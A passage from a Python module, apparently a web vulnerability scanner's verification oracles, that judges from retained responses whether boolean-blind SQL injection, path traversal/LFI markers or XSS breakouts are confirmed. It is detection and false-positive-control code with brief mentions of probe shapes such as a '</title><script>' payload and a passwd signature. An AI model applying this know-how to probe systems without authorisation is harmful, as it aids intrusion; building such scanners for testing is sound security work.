          repeats are cache HITS, not independent draws, and re-running the SAME clauses in a
          later round returns the SAME bytes — so neither the repeats nor the extra SPRT rounds are
          new evidence, and the per-FINDING bound degrades to the single-draw one:

              SUM over a != b of  p_a**K_T * p_b**K_F   <=  2 * 2**-(K_T + K_F)

          = ``1.2e-4`` at ``K = 7``, and the formula is CALIBRATED, not assumed: over the real
          mint path a uniform 2-variant cached page measures ``1.20e-4`` at ``K = 7``
          (200k trials) against an analytic ``1.22e-4``, and ``7.9e-3`` at ``K = 4`` against an
          analytic ``7.8e-3``. (A
          single-clause-per-truth-value design — what this test replaced — sits at ``~0.5``.)
          Repetition cannot help against a map that is by definition constant in the request, so
          for THIS case more distinct clauses is the lever — and it is the lever that keeps the
          seventh shipped clause (the ``IN (SELECT ...)`` pair) in the set now that its original
          "a folder cannot decide it" justification is retracted: at ``K = 6`` this residual is 4x
          worse (analytic ``2 * 2**-12`` = ``4.9e-4``). It is not free: every extra clause is
          another chance that a real vulnerable target answers ONE of them differently and the
          round refutes, so ``K`` trades this residual against recall. The drivers also BOUND the
          number of independent attempts per URL and state the resulting per-URL figure (see
          ``live/runtime_redrive.py::boolean_redrive``).

    THE TWO DETERMINISM MECHANISMS ARE A CHEAP PRE-FILTER, NOT THE SOUNDNESS CORE:
      1. BASELINE PRE-GATE — ``false_baseline_samples`` is a run of ``>= min_baseline_samples``
         responses to ONE IDENTICAL false-clause request collected up front; not-all-identical
         proves non-determinism → REFUSE. A confirm still REQUIRES it to have passed
         (fail-closed), but it is no longer what makes the oracle sound.
      2. PER-ROUND HARD REFUTE — if ANY clause's byte-identical repeat differs from the clause,
         the WHOLE finding hard-refutes (the page is provably non-deterministic).

    CALLER OBLIGATION (the oracle sees responses, not requests). The ``K_T``/``K_F`` clauses must
    genuinely be DISTINCT requests of a FIXED truth value and must VARY IN COMPARISON SHAPE rather
    than only in their literals — which buys refutation against every INCOMPLETE request-side
    filter and nothing beyond it (residual (a) above stays OPEN whatever the caller ships). The
    oracle cannot check any of that from the bytes. The drivers enforce distinctness where the
    clauses live (``BooleanInferenceCheck`` and ``DifferentialHttpAdapter`` both refuse a duplicate
    or a cross-side clause at the call site) and build their families from
    ``scanner.checks.boolean_clause_families``; the shape property is a review obligation on the
    clause sets, pinned by the live CRS-942130, constant-folder and leave-one-shape-out
    regressions — the folder cell PINS the open class (it must keep minting), not a win.

    WHAT "RE-VERIFIES OFFLINE" DOES AND DOES NOT MEAN. Re-execution over a retained context
    recomputes this whole decision from the retained bytes, so a GROSS edit (a swapped page, a
    dropped arm, a removed baseline, a truncated clause list) is rejected. It is NOT a byte
    integrity check: the comparison is deliberately FUZZY (``length`` 5%, ``lexical`` 10%), so a
    sub-threshold edit inside a retained body — a byte, a word — does not change the verdict.
    Byte integrity comes from the certificate signature and digest binding, not from this oracle.

    FAIL-CLOSED ON SHAPE. A round that does not carry the multi-clause truth-value arms — an
    OLD single-clause retained context ``{"true", "false_a", "false_b", "false_a_repeat"}``
    included — can NEVER be a positive signal: it yields 0 and the SPRT refutes. Old-shape
    evidence can only refute, never mint.

    RECALL COST (honest, and the safe direction). A legitimately noisy-but-vulnerable page
    (per-request ``__VIEWSTATE`` / CSRF token / rotating banner), and a vulnerable page whose
    varied true clauses do not all land on the same response, are REFUSED to a LEAD. That is a
    documented false-LEAD, never a false FACT.
    """
    rounds = [r for r in (probe_rounds or []) if isinstance(r, Mapping)]

    def _nondeterministic(reason: str) -> OracleSignal:
        # A non-deterministic page cannot support boolean inference → LEAD, never a FACT and never a
        # CLEAN (conclusive=False): the page MIGHT be vulnerable but noisy — refusing it is a recall
        # cost, not a proof of safety. decision="refute" (fired=False) so a downstream refute-branch
        # still classifies it as "did not mint", while conclusive=False keeps it out of any CLEAN.
        return OracleSignal(
            kind=OracleKind.BOOLEAN_INFERENCE, fired=False, confidence=0.0, conclusive=False,
            evidence=("boolean inference REFUSED — page is not deterministic to identical input "
                      f"({reason}); boolean-blind inference is unsound on a non-deterministic page → LEAD"),
            observed={"decision": "refute", "nondeterministic": True, "reason": reason},
        )

    # PIN the dimensions (never latency / marker) and force expect="differ" — see _BOOLEAN_DIMENSIONS.
    disc = _boolean_discriminator(discriminator)

    def _same(a: Any, b: Any) -> bool:
        """Do two observed responses AGREE? ``differential_response_oracle`` is the authority; an
        EXACT match short-circuits it (identical bytes + identical status make every dimension
        non-differing, so the oracle provably cannot fire) — a pure speed path, never a
        semantic one.

        Before the discriminator compares them, each response has ITS OWN reflected injected clause
        removed (``_mask_boolean_reflection``): on a page that echoes the distinct clause back into
        its body, two same-truth-value responses only DIFFER in that reflection, so masking is what
        lets a genuine channel behind a reflection attribute. It never manufactures one — a reflect-
        only page masks to the SAME residual on both sides and stays indistinguishable. A response
        with no retained ``clause`` masks to itself, so a non-reflecting target is unchanged."""
        if a == b:
            return True
        return not differential_response_oracle(
            _mask_boolean_reflection(a), _mask_boolean_reflection(b), disc).fired

    # --- PRE-FILTER 1: BASELINE DETERMINISM PRE-GATE ----------------------------------------------
    baseline = list(false_baseline_samples) if false_baseline_samples is not None else None
    baseline_deterministic = False
    if baseline is not None and len(baseline) >= 2:
        ref = baseline[0]
        if any(not _same(ref, s) for s in baseline[1:]):
            return _nondeterministic(
                f"{len(baseline)} identical-request baseline samples are not all identical")
        baseline_deterministic = len(baseline) >= min_baseline_samples

    # --- PRE-FILTER 2: HARD REFUTE on any observed non-determinism (a byte-identical repeat that
    #     came back different). Covers every clause of the new shape AND the legacy false_a pair. ---
    for r in rounds:
        pairs = list(zip(_boolean_round_arm(r, "trues"), _boolean_round_arm(r, "true_repeats")))
        pairs += list(zip(_boolean_round_arm(r, "falses"), _boolean_round_arm(r, "false_repeats")))
        legacy_rep = r.get("false_a_repeat")
        if legacy_rep is not None and "false_a" in r:
            pairs.append((r["false_a"], legacy_rep))
        for clause_resp, repeat_resp in pairs:
            if not _same(clause_resp, repeat_resp):
                return _nondeterministic(
                    "a byte-identical clause repeat returned a different response in a probe round")

    def _truth_value_attributed(r: Mapping[str, Any]) -> bool:
        """THE SOUNDNESS CORE — is this round's response a FUNCTION of the injected truth value?
        One TRUE cluster, one FALSE cluster, and the two disjoint. Short-circuits."""
        trues = _boolean_round_arm(r, "trues")
        falses = _boolean_round_arm(r, "falses")
        t_reps = _boolean_round_arm(r, "true_repeats")
        f_reps = _boolean_round_arm(r, "false_repeats")
        # FAIL-CLOSED on shape: too few DISTINCT clauses per truth value, or a missing repeat, and the
        # round cannot attribute anything → it is not a positive signal (an old-shape round lands here).
        if (len(trues) < min_true_clauses or len(falses) < min_false_clauses
                or len(t_reps) != len(trues) or len(f_reps) != len(falses)):
            return False
        t_cluster = trues + t_reps
        f_cluster = falses + f_reps
        # (2) WITHIN-TRUTH AGREEMENT — all of one truth value land on ONE response.
        for cluster in (t_cluster, f_cluster):
            for i in range(len(cluster)):
                for j in range(i + 1, len(cluster)):
                    if not _same(cluster[i], cluster[j]):
                        return False
        # (3) ACROSS-TRUTH SEPARATION — every TRUE response differs from every FALSE response.
        for t in t_cluster:
            for f in f_cluster:
                if _same(t, f):
                    return False
        return True

    def _round_signals():
        for r in rounds:
            yield _truth_value_attributed(r)

    decided, llr, n_used, signals, upper, lower = _sprt_decision(
        _round_signals(), alpha=alpha, beta=beta, p1=p1, p0=p0)

    observed = {
        "rounds_used": n_used, "signal_rounds": signals, "llr": llr,
        "upper": upper, "lower": lower, "decision": decided or "inconclusive",
        "baseline_samples": (len(baseline) if baseline is not None else 0),
        "baseline_deterministic": baseline_deterministic,
        "min_true_clauses": min_true_clauses, "min_false_clauses": min_false_clauses,
        # the ACTUAL clause counts the judged rounds carried (the analytic bound is a function of THESE,
        # not of the floor) — recorded so an auditor can recompute the bound from the retained evidence.
        "true_clauses_per_round": sorted({len(_boolean_round_arm(r, "trues")) for r in rounds}),
        "false_clauses_per_round": sorted({len(_boolean_round_arm(r, "falses")) for r in rounds}),
    }
    if decided == "confirm":
        # FAIL-CLOSED determinism pre-filter: a FACT also requires the baseline pre-gate to have PASSED
        # (>= min_baseline_samples identical up-front samples). Belt-and-braces on top of the
        # truth-value attribution that carries the soundness — a confirm without a determinism proof is
        # DOWNGRADED to inconclusive (a LEAD, never a FACT).
        if not baseline_deterministic:
            observed["decision"] = "inconclusive"
            observed["confirm_without_baseline_pregate"] = True
            return OracleSignal(
                kind=OracleKind.BOOLEAN_INFERENCE, fired=False, confidence=0.0, conclusive=False,
                evidence=(
                    f"SPRT reached the confirm boundary in {n_used} round(s) but the baseline "
                    f"determinism pre-gate did NOT pass ({observed['baseline_samples']} < "
                    f"{min_baseline_samples} identical up-front samples) — a boolean FACT requires "
                    "proving the page is deterministic to identical input first → LEAD"),
                observed=observed,
            )
        # confidence reflects the controlled type-I error rate of the test
        confidence = min(0.99, 1.0 - alpha)
        return OracleSignal(
            kind=OracleKind.BOOLEAN_INFERENCE, fired=True, confidence=confidence,
            evidence=(
                f"SPRT confirmed boolean inference in {n_used} round(s): {signals} round(s) in which the "
                f"response was a FUNCTION of the injected truth value "
                f"(K_T={observed['true_clauses_per_round']} distinct TRUE clauses all agree, "
                f"K_F={observed['false_clauses_per_round']} distinct FALSE clauses all agree, each also "
                f"stable to a byte-identical repeat, and the two clusters disjoint), behind a passed "
                f"determinism pre-gate ({observed['baseline_samples']} identical baseline samples), "
                f"LLR={llr:.2f} >= {upper:.2f}"
            ),
            observed=observed,
        )
    reason = "refuted (indistinguishable)" if decided == "refute" else "inconclusive (no boundary reached)"
    # A REFUTE decision is a channel-confirmed negative: the SPRT accumulated enough
    # evidence to accept the null (no boolean channel) at the controlled type-II rate,
    # so it is a decisive "provably-tested-clean". Running out of rounds WITHOUT reaching
    # a boundary is genuinely inconclusive (never a clean), so it is NOT conclusive.
    return OracleSignal(
        kind=OracleKind.BOOLEAN_INFERENCE, fired=False, confidence=0.0,
        conclusive=(decided == "refute"),
        evidence=f"SPRT {reason} after {n_used} round(s): LLR={llr:.2f} in ({lower:.2f}, {upper:.2f})",
        observed=observed,
    )


def _searchable(sink: Any) -> str:
    if isinstance(sink, Mapping):
        return "\n".join(f"{k}={_coerce_text(v)}" for k, v in sink.items())
    if isinstance(sink, (list, tuple)):
        return "\n".join(_coerce_text(x) for x in sink)
    return _coerce_text(sink)


def side_effect_oracle(marker: str, observed_sink: Any, control_sink: Any = None) -> OracleSignal:
    """Fire when a unique, attacker-chosen marker appears somewhere it should not.

    WHERE THIS ORACLE IS THE SOLE AUTHORITY (`verifier.BUG_CLASS_ORACLES`):
    ``path_traversal`` and ``lfi``. Nothing else adjudicates those two classes, so
    for them this function's verdict IS the FACT. It is also one of several
    confirmers for ``error_based_sqli`` / ``sqli`` / ``rce`` / ``command_injection``
    / ``ssti`` / ``el_injection`` / ``ssi`` / ``xxe`` / ``websocket_injection``.

    WHERE IT IS **NOT** USED: XSS. A "reflected/stored XSS canary in rendered
    output" is precisely what this oracle must NOT be used for — ``xss`` goes to
    REFLECTION_CONTEXT (a proven breakout) and ``stored_xss``/``dom_xss`` to
    DOM_EXECUTION (proven execution). Marker-in-a-sink is substring XSS detection,
    the false positive both of those exist to refuse.

    The marker must be non-trivial (>= 4 chars) so we do not confirm on incidental
    substrings.

    ``control_sink`` (OPTIONAL — absent ⇒ every existing caller is byte-identical) is the sink
    observed under a BENIGN control on the same insertion point. When it is supplied and ALREADY
    CONTAINS the marker, the marker's presence under the payload is NOT attributable to the payload
    and the oracle REFUSES. That is the offline-re-derivable half of the fix for a measured defect:
    a marker that is not attacker-UNIQUE (a KNOWN-CONTENT file signature such as ``root:x:0:0:``)
    is present in an ordinary security knowledge-base page that merely documents it, and bare
    substring presence minted four ``path_traversal`` FACTs against a site with ZERO file I/O.
    Producers that hold a control must retain it here so re-verification re-derives the refusal.

    KNOWN LIMITATION (RED-PEN), only PARTLY closed by ``control_sink``: a marker's PRESENCE in a
    sink is not proof that the PAYLOAD put it there — an endpoint that echoes its own input into the
    sink produces the same observation. A supplied ``control_sink`` refuses the KNOWN-CONTENT case,
    but where no control is supplied, and for the sole-authority ``path_traversal``/``lfi`` classes,
    a full payload-correlation / content-provenance guard is still owed (its own slice). Until then,
    treat a bare ``path_traversal``/``lfi`` confirmation as needing a human look at the snippet.

    Pure: it decides from the retained sinks alone and sends nothing."""
    marker = (marker or "").strip()
    haystack = _searchable(observed_sink)

    if len(marker) < 4:
        return OracleSignal(
            kind=OracleKind.SIDE_EFFECT, fired=False, confidence=0.0,
            evidence="marker too short to be a reliable canary",
            observed={"marker": marker})

    if control_sink is not None and marker in _searchable(control_sink):
        return OracleSignal(
            kind=OracleKind.SIDE_EFFECT, fired=False, confidence=0.0,
            evidence=(f"marker {marker!r} is ALREADY PRESENT in the benign control response — its "
                      "presence under the payload is not attributable to the payload"),
            observed={"marker": marker, "present_in_control": True})

    idx = haystack.find(marker)
    if idx < 0:
        return OracleSignal(
            kind=OracleKind.SIDE_EFFECT, fired=False, confidence=0.0,
            evidence=f"marker {marker!r} not present in sink",
            observed={"marker": marker})

    start = max(0, idx - 24)
    snippet = haystack[start: idx + len(marker) + 24]
    return OracleSignal(
        kind=OracleKind.SIDE_EFFECT,
        fired=True,
        confidence=0.9,
        evidence=f"marker {marker!r} reached sink: ...{snippet}...",
        observed={"marker": marker, "offset": idx, "snippet": snippet},
    )


_INERT_TEXT_CONTAINERS = frozenset({
    "noscript", "noembed", "noframes", "textarea", "title", "template",
    "iframe", "xmp", "plaintext", "style",
})


_JS_MIME_ESSENCES = frozenset({
    "application/ecmascript", "application/javascript", "application/x-ecmascript",
    "application/x-javascript", "text/ecmascript", "text/javascript",
    "text/javascript1.0", "text/javascript1.1", "text/javascript1.2",
    "text/javascript1.3", "text/javascript1.4", "text/javascript1.5",
    "text/jscript", "text/livescript", "text/x-ecmascript", "text/x-javascript",
})


def _script_is_executable(
    type_attr: str | None, has_nomodule: bool
) -> tuple[bool, str]:
    """Decide whether a browser EXECUTES a ``<script>``'s inline text, from its RAW
    ``type`` attribute value and the presence of ``nomodule``.

    Returns ``(executable, reason)``; ``reason`` names the non-executing rule.

    ``type_attr`` is the RAW attribute value (``None`` when the attribute is
    absent) — *not* stripped and *not* lowercased by the caller, because the HTML
    Living Standard's rules distinguish the raw empty string from a whitespace-only
    value. Pure and deterministic. Every branch below is measured against
    /usr/bin/chromium 150 in ``test_script_type_executability_matches_chromium``:

      * attribute ABSENT              -> classic, EXECUTES
      * ``type=""`` (raw empty)       -> classic, EXECUTES  (LS: "if the type
        attribute's value is the empty string, the script block's type is classic")
      * ``type=" "`` / ``type="\\t"``  -> does NOT execute. The empty-string rule is
        about the RAW value; a whitespace-only value strips to ``""``, which is not
        a JavaScript MIME essence and is not ``module``, so the element is a data
        block. (Chromium: measured inert. The old code stripped first and let it in
        through the ``""`` member.)
      * stripped, case-folded value in :data:`_JS_MIME_ESSENCES` -> EXECUTES
      * raw value case-insensitively equal to ``module`` -> EXECUTES.  The match is
        on the UNSTRIPPED value: Chromium runs ``type="MODULE"`` and does NOT run
        ``type=" module "``.  Where Chromium and the LS may differ (the LS strips),
        this oracle takes the NON-FIRING option — a missed detection, never a
        manufactured FACT.
      * ``nomodule`` present on a CLASSIC script -> does NOT execute ("prepare the
        script element" step 13 returns early). Measured: ``<script nomodule>``
        inert, ``<script type="module" nomodule>`` EXECUTES (``nomodule`` is
        ignored for module scripts), ``nomodule="false"`` inert (boolean attribute
        — presence is the test)."""
    if type_attr is None:
        is_module, executable = False, True
    elif type_attr == "":
        is_module, executable = False, True
    else:
        lowered = type_attr.lower()
        is_module = lowered == "module"
        executable = is_module or type_attr.strip().lower() in _JS_MIME_ESSENCES
    if not executable:
        return False, "script_data_block"
    if has_nomodule and not is_module:
        return False, "script_nomodule_ignored"
    return True, ""


_EVENT_HANDLER_ATTRIBUTES = frozenset({
    # AUDIT-B4 (measured in Chromium 150): real handler content attributes this
    # closed set was missing.
    "oncommand", "oncontentvisibilityautostatechange", "onmousewheel",
    "onscrollsnapchange", "onscrollsnapchanging",
    # HTML LS: element / document / window event handlers
    "onabort", "onauxclick", "onbeforeinput", "onbeforematch", "onbeforetoggle",
    "onblur", "oncancel", "oncanplay", "oncanplaythrough", "onchange", "onclick",
    "onclose", "oncontextlost", "oncontextmenu", "oncontextrestored", "oncopy",
    "oncuechange", "oncut", "ondblclick", "ondrag", "ondragend", "ondragenter",
    "ondragexit", "ondragleave", "ondragover", "ondragstart", "ondrop",
    "ondurationchange", "onemptied", "onended", "onerror", "onfocus", "onformdata",
    "oninput", "oninvalid", "onkeydown", "onkeypress", "onkeyup", "onload",
    "onloadeddata", "onloadedmetadata", "onloadstart", "onmousedown", "onmouseenter",
    "onmouseleave", "onmousemove", "onmouseout", "onmouseover", "onmouseup",
    "onpaste", "onpause", "onplay", "onplaying", "onprogress", "onratechange",
    "onreset", "onresize", "onscroll", "onscrollend", "onsecuritypolicyviolation",
    "onseeked", "onseeking", "onselect", "onslotchange", "onstalled", "onsubmit",
    "onsuspend", "ontimeupdate", "ontoggle", "onvolumechange", "onwaiting", "onwheel",
    # HTML LS: Window-reflecting handlers (<body> / <frameset>)
    "onafterprint", "onbeforeprint", "onbeforeunload", "onhashchange",
    "onlanguagechange", "onmessage", "onmessageerror", "onoffline", "ononline",
    "onpagehide", "onpagereveal", "onpageshow", "onpageswap", "onpopstate",
    "onrejectionhandled", "onstorage", "onunhandledrejection", "onunload",
    # CSS animations / transitions
    "onanimationcancel", "onanimationend", "onanimationiteration", "onanimationstart",
    "ontransitioncancel", "ontransitionend", "ontransitionrun", "ontransitionstart",
    "onwebkitanimationend", "onwebkitanimationiteration", "onwebkitanimationstart",
    "onwebkittransitionend",
    # Pointer / touch / gesture
    "ongotpointercapture", "onlostpointercapture", "onpointercancel", "onpointerdown",
    "onpointerenter", "onpointerleave", "onpointermove", "onpointerout",
    "onpointerover", "onpointerrawupdate", "onpointerup", "ontouchcancel",
    "ontouchend", "ontouchmove", "ontouchstart",
    # Misc. widely-implemented content attributes
    "onbeforecopy", "onbeforecut", "onbeforepaste", "onfocusin", "onfocusout",
    "onfullscreenchange", "onfullscreenerror", "oninputsourceschange", "onsearch",
    "onselectionchange", "onselectstart", "onshow", "onwebkitfullscreenchange",
    "onwebkitfullscreenerror",  # ("ontoggle" listed once, with the HTML LS block above)
})


_ON_SHAPED_ATTRIBUTE = re.compile(r"on[a-z]+\Z")


def _rindex(seq: list[str], value: str) -> int:
    """Index of the LAST occurrence of ``value`` in ``seq``. Pure; the caller has
    already checked membership."""
    return len(seq) - 1 - seq[::-1].index(value)


def _js_scan(script_text: str, idx: int) -> tuple[bool, str]:
    """Walk ``script_text`` up to ``idx`` and report
    ``(at_code_position, ambiguity)``.

    ``at_code_position`` is True iff offset ``idx`` is NOT inside a string literal,
    template literal or comment. It is meaningful ONLY when ``ambiguity`` is the
    empty string.

    ``ambiguity`` names the first construct this deliberately-small, pure,
    stdlib-only lexer does NOT model. The caller MUST fail closed on it.

    RED-PEN B1 (the reason this function exists in this shape). The previous
    version claimed "every misparse biases toward NOT-code → NOT-firing. The
    failure direction is a missed detection, never a manufactured FACT". That was
    FALSE, and reproduced in five shapes. The lexer had no regex-literal state, so
    ``/it's/`` opened a PHANTOM single-quote state, and the OPENING quote of the
    NEXT real string CLOSED it — leaving the real string's CONTENTS at apparent
    code position. One quote of desync manufactures a High ``xss`` FACT at 0.90 on
    a CORRECTLY ESCAPED page. The same one-quote desync is reachable through
    Annex B ``<!--`` / ``-->`` (SingleLineHTMLOpenComment / HTMLCloseComment, which
    a browser lexes as line comments inside a classic script) and through a
    template-literal substitution ``${…}`` whose body contains a quote or a nested
    backtick.

    So the lexer no longer guesses. Each unmodelled construct encountered BEFORE
    the marker offset aborts the walk with an ``ambiguity`` name:

      ``regex_literal``          a ``/`` at apparent code position that is not
                                 ``//`` or ``/*`` — a regex literal or a division,
                                 and this lexer cannot tell which;
      ``html_comment``           ``<!--`` or ``-->`` anywhere before the marker;
      ``template_substitution``  a ``${`` inside a template literal;
      ``hashbang``               a ``#!`` at apparent code position that is NOT at
                                 offset 0 (see below).

    AUDIT-B3 — the HashbangComment. ``#!`` at offset 0 of a script's source text is
    a comment running to the end of the first line (ECMA-262 § Hashbang Comments;
    ``node -e`` and Chromium agree). The lexer had no state for it, found no
    ambiguity, and reported the first line as CODE POSITION — measured firing at
    0.90 on ``<script>#! …</script>`` that Chromium does not execute at all. That is
    the same class B1's fail-closed design exists to eliminate, so it is modelled
    here rather than merely refused:

      * at offset 0 the walk skips to the first line terminator — EXACT, so a
        marker on the hashbang line is correctly "not code" and a marker after it
        is still adjudicated normally (no capability lost);
      * anywhere else ``#!`` at code position is a SyntaxError, so the whole script
        fails to parse and NOTHING executes — the lexer refuses rather than
        silently call the surrounding text code.

    A ``#!`` inside a string literal (``var r = "#!/users"`` — the legacy hashbang
    routing shape) is in string state and is not reached by either rule, so this
    costs no real detection; measured.

    A missed detection is an INCONCLUSIVE advisory and recoverable. A manufactured
    FACT is not. Pure and deterministic."""
    n = len(script_text)
    stop = min(idx, n)
    head = script_text[:stop]
    # Annex B HTML-like comments are lexed by a real JS engine as line comments;
    # this lexer does not model them at all, so their mere PRESENCE before the
    # marker is ambiguity. Checked as a substring (not gated on lexer state)
    # because the HTML tokenizer's script-data-escaped states react to ``<!--``
    # irrespective of JS string context.
    if "<!--" in head or "-->" in head:
        return False, "html_comment"

    state: str | None = None   # None | "'" | '"' | "`" | "//" | "/*"
    i = 0
    # AUDIT-B3: a HashbangComment is legal ONLY at offset 0 and runs to the first
    # line terminator. Modelled exactly. (Only \n and \r are treated as
    # terminators, matching the "//" state below: recognising fewer terminators
    # extends the comment, which is the NON-FIRING direction.)
    if script_text.startswith("#!"):
        j = 2
        while j < n and script_text[j] not in ("\n", "\r"):
            j += 1
        if stop <= j:
            return False, ""       # the marker sits INSIDE the hashbang comment
        i = j
    while i < stop:
        c = script_text[i]
        if state is None:
            if c in ("'", '"', "`"):
                state = c
            elif c == "#" and i + 1 < n and script_text[i + 1] == "!":
                # AUDIT-B3: `#!` away from offset 0 is a SyntaxError — the script
                # never runs, so "code position" is not a claim this lexer may
                # make. FAIL CLOSED. (`#x` private names are untouched.)
                return False, "hashbang"
            elif c == "/":
                nxt = script_text[i + 1] if i + 1 < n else ""
                if nxt == "/":
                    state = "//"
                    i += 1
                elif nxt == "*":
                    state = "/*"
                    i += 1
                else:
                    # A regex literal or a division — indistinguishable without a
                    # full token stream. FAIL CLOSED.
                    return False, "regex_literal"
        elif state in ("'", '"'):
            if c == "\\":
                i += 1
            elif c == state:
                state = None
        elif state == "`":
            if c == "\\":
                i += 1
            elif c == "$" and i + 1 < n and script_text[i + 1] == "{":
                # A substitution's body is CODE (it may contain strings, nested
                # template literals and regexes). Not modelled → FAIL CLOSED.
                return False, "template_substitution"
            elif c == "`":
                state = None
        elif state == "//":
            if c in ("\n", "\r"):
                state = None
        elif state == "/*":
            if c == "*" and i + 1 < n and script_text[i + 1] == "/":
                state = None
                i += 1
        i += 1
    return state is None, ""


class _ReflectionScanner(HTMLParser):
    """Locate a marker's parse context with stdlib HTML parsing, and decide whether
    the payload PROVABLY BROKE OUT into that position (see the module note above).

    ``context`` is set only for a proven breakout (``html_tag`` / ``js_attribute:…``
    / ``script``). ``advisory`` records the strongest NON-proving observation — the
    marker was seen in/near an executable position but as escaped DATA the page put
    there, which is not a breakout."""

    def __init__(self, marker_lower: str) -> None:
        super().__init__(convert_charrefs=True)
        self._ml = marker_lower
        self._in_script = False
        self._script_executable = False
        # RED-PEN B2: per the HTML spec a <script> that bears a `src` IGNORES its
        # child text entirely — the element's inline content never runs. The old
        # `_script_executable` looked only at `type`, so
        # `<script src="/app.js">MARKER();</script>` fired at 0.90 on text no
        # browser evaluates.
        self._script_has_src = False
        # AUDIT-B2: `nomodule` makes a CLASSIC script non-executing.
        self._script_nonexec_reason = ""
        # RED-PEN B1: the JS lexer starts from a known state only at the FIRST data
        # chunk of a script element. If HTMLParser ever splits a script's text, a
        # later chunk begins mid-token and "code position" is unknowable — so a
        # continuation chunk is ambiguity, never a breakout.
        self._script_chunk = 0
        self._inert_depth = 0
        # AUDIT-B1: the innermost open inert container, so the advisory can NAME it.
        self._inert_tags: list[str] = []
        self.context: str | None = None
        self.detail: str = ""
        self.advisory: str | None = None
        self.advisory_detail: str = ""

    # -- advisory bookkeeping ------------------------------------------------

    def _note(self, kind: str, detail: str = "") -> None:
        if self.advisory is None:
            self.advisory, self.advisory_detail = kind, detail

    # -- parser callbacks ----------------------------------------------------

    def handle_starttag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
        t = tag.lower()
        if t == "script":
            # AUDIT-B2: keep the RAW `type` value — the LS distinguishes the raw
            # empty string (classic) from a whitespace-only one (a data block), and
            # the essence match forbids parameters. No `.split(";")`, no pattern.
            raw_type: str | None = None
            has_src = False
            has_nomodule = False
            # HTML DUPLICATE-ATTRIBUTE FIRST-WINS: the tokenizer keeps the FIRST occurrence of an attribute
            # name and DISCARDS every later one, so `<script type="application/json" type="text/javascript">`
            # is a DATA block to Chromium — the FIRST `type` (a JSON essence) wins, not the executable one.
            # Take the first `type` only (`raw_type is None` == "not yet seen"). `has_src` / `has_nomodule`
            # are presence flags, so which duplicate wins does not change them.
            for name, val in attrs:
                lname = name.lower()
                if lname == "type" and raw_type is None:
                    raw_type = val if val is not None else ""
                elif lname == "src":
                    has_src = True
                elif lname == "nomodule":
                    has_nomodule = True
            self._in_script = True
            executable, reason = _script_is_executable(raw_type, has_nomodule)
            self._script_executable = executable
            self._script_nonexec_reason = reason
            self._script_has_src = has_src
            self._script_chunk = 0
        if t in _INERT_TEXT_CONTAINERS:
            self._inert_depth += 1
            self._inert_tags.append(t)
        if self.context is not None:
            return

        inert = self._inert_depth > 0
        if self._ml in t:
            if inert:
                self._note("inert_text_container", t)
            else:
                self.context, self.detail = "html_tag", tag
            return
        # HTML DUPLICATE-ATTRIBUTE FIRST-WINS (the same tokenizer rule as the <script> `type` above): once an
        # attribute NAME has been seen on this tag the tokenizer discards every later occurrence, so it never
        # reaches Chromium. `<div onclick="void 0" onclick="MARKER">` runs `void 0` (the FIRST onclick) and
        # `<a href="#" href="javascript:MARKER">` navigates `#` (the FIRST href) — the marker in the SECOND
        # occurrence is inert. The name is recorded on first sight, BEFORE the marker filter, so a duplicate
        # is dropped even when the first occurrence carried no marker; refusing it kills FACTs Chromium would
        # never execute.
        seen_attr_names: set[str] = set()
        for name, val in attrs:
            a = name.lower()
            if a in seen_attr_names:
                continue
            seen_attr_names.add(a)
            v = val or ""
            if self._ml not in v.lower():
                continue
            stripped = v.strip()
            # RED-PEN B2: membership of the CLOSED event-handler set, never an
            # `on` prefix (`on-click` / `once` / `online` are not handlers).
            is_handler = a in _EVENT_HANDLER_ATTRIBUTES
            is_js_url = (a in ("href", "src", "action", "formaction")
                         and stripped.lower().startswith("javascript:"))
            if not (is_handler or is_js_url):
                # AUDIT-B4 — a CLOSED-SET MISS MUST NOT FALL THROUGH TO "CLEAN".
                # The comment on `_EVENT_HANDLER_ATTRIBUTES` promises a miss is "a
                # non-firing advisory — recoverable". Without this branch it was
                # not: nothing called `_note`, so the scan reached the terminal
                # `conclusive=True` return and `probe_verdict` certified the probe
                # CLEAN. Measured on `oncontentvisibilityautostatechange`, a real
                # Chromium-executed handler: a true positive became a
                # channel-confirmed clean. Any `on`-SHAPED non-member is therefore
                # an advisory. It still cannot FIRE — firing needs membership.
                if _ON_SHAPED_ATTRIBUTE.match(a):
                    if inert:
                        self._note("inert_text_container", name)
                    else:
                        self._note("unmodelled_handler_shape", name)
                continue
            if inert:
                self._note("inert_text_container", name)
                continue
            # SOUND BREAKOUT (R5): the attacker must own the WHOLE executable value.
            # A marker embedded inside a larger expression the PAGE composed
            # (``onclick="search(&quot;…marker…&quot;)"``) is the page's own handler
            # with the value correctly escaped into it — it did not break out.
            body = stripped
            if is_js_url:
                body = stripped[len("javascript:"):].strip()
            if body.lower() == self._ml:
                self.context, self.detail = f"js_attribute:{name}", name
                return
            self._note("js_attribute_data", name)

    def _close(self, t: str) -> None:
        if t == "script":
            self._in_script = False
            self._script_executable = False
            self._script_nonexec_reason = ""
            self._script_has_src = False
            self._script_chunk = 0
        if t in _INERT_TEXT_CONTAINERS and t in self._inert_tags:
            # AUDIT-B1: close back to the MATCHING open container. An UNMATCHED end
            # tag must be IGNORED, exactly as a browser ignores one — a plain
            # `self._inert_depth -= 1` let the shipped `</title><script>{marker}`
            # payload cancel an enclosing `<noscript>` that was never closed, and
            # the marker was reported live again. Chromium, measured: it is not.
            del self._inert_tags[_rindex(self._inert_tags, t):]
            self._inert_depth = len(self._inert_tags)

    def handle_startendtag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
        self.handle_starttag(tag, attrs)
        # a self-closing form opens nothing, so undo the container/script bookkeeping
        self._close(tag.lower())

    def handle_endtag(self, tag: str) -> None:
        self._close(tag.lower())

    def handle_data(self, data: str) -> None:
        if not self._in_script:
            return
        chunk = self._script_chunk
        self._script_chunk += 1
        if self.context is not None:
            return
        low = data.lower()
        idx = low.find(self._ml)
        if idx < 0:
            return
        if self._inert_depth > 0:
            # AUDIT-B1 — `_inert_depth` was maintained but READ ONLY in
            # `handle_starttag`. Python's HTMLParser has RCDATA handling for
            # textarea/title/iframe/xmp, so those were ACCIDENTALLY safe — but NOT
            # for <noscript> (with scripting enabled the HTML LS gives its start tag
            # the generic RAW TEXT algorithm) or <template> (whose contents live in
            # an inert DocumentFragment). So a nested <script> inside either was
            # reported live. Measured: `<noscript><script>M</script></noscript>` and
            # the <template> twin both fired 0.90 ctx=script; Chromium executes
            # NEITHER, and six SHIPPED m2 payloads minted a High/0.9 xss FACT
